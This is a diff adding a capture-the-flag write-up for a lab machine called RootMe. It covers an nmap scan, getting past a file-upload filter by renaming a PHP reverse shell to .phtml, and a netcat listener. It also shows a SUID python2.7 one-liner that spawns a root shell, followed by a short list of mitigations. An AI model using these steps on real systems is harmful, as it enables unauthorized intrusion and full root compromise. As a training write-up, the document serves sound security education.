@@ -1,0 +1,87 @@
+📝 CTF Write-Up: RootMe
+
+🎯 Target Information
+
+Property	Value
+IP Address	10.48.175.99
+Difficulty	Easy
+Skills	Web Exploitation, Privilege Escalation
+🔍 Reconnaissance
+Port Scanning
+Started with an Nmap scan to identify open ports:
+bash
+
+nmap -sC -sV -oN nmap_scan.txt 10.48.175.99
+Results:
+
+Port	Service	Version
+22	SSH	OpenSSH
+80	HTTP	Apache
+🌐 Web Enumeration
+Navigating to http://10.48.175.99/ revealed a web application. Further directory enumeration discovered:
+
+http://10.48.175.99/panel/
+This page contained a file upload functionality.
+
+🚀 Exploitation
+File Upload Bypass
+The upload form blocked .php extensions. To bypass this filter, I renamed my reverse shell:
+bash
+
+mv shell.php shell.phtml
+Reverse Shell Setup
+1. Started a listener:
+bash
+
+nc -lvnp 4444
+2. Uploaded shell.phtml via /panel/
+3. Triggered the shell by accessing the uploaded file
+✅ Initial foothold obtained!
+
+🏁 User Flag
+Located the user flag:
+bash
+
+find / -name "user.txt" 2>/dev/null
+
+/var/www/user.txt
+bash
+
+cat /var/www/user.txt
+🚩 User flag captured!
+
+⬆️ Privilege Escalation
+SUID Binary Enumeration
+Searched for SUID binaries:
+bash
+
+find / -user root -perm -u=s -type f 2>/dev/null
+Interesting finding:
+
+/usr/bin/python2.7
+
+⚠️ Python with SUID bit is a critical misconfiguration!
+Exploiting Python SUID
+Leveraged Python to spawn a root shell:
+bash
+
+/usr/bin/python2.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
+bash
+
+whoami# root
+✅ Root access achieved!
+
+🏁 Root Flag
+bash
+
+cat /root/root.txt
+🚩 Root flag captured!
+📚 Lessons Learned
+
+Vulnerability	Mitigation
+Weak file upload filter	Whitelist allowed extensions, validate MIME types
+Python SUID misconfiguration	Remove unnecessary SUID bits from interpreters
+🛠️ Tools Used
+* Nmap
+* Netcat
+* PHP Reverse Shell
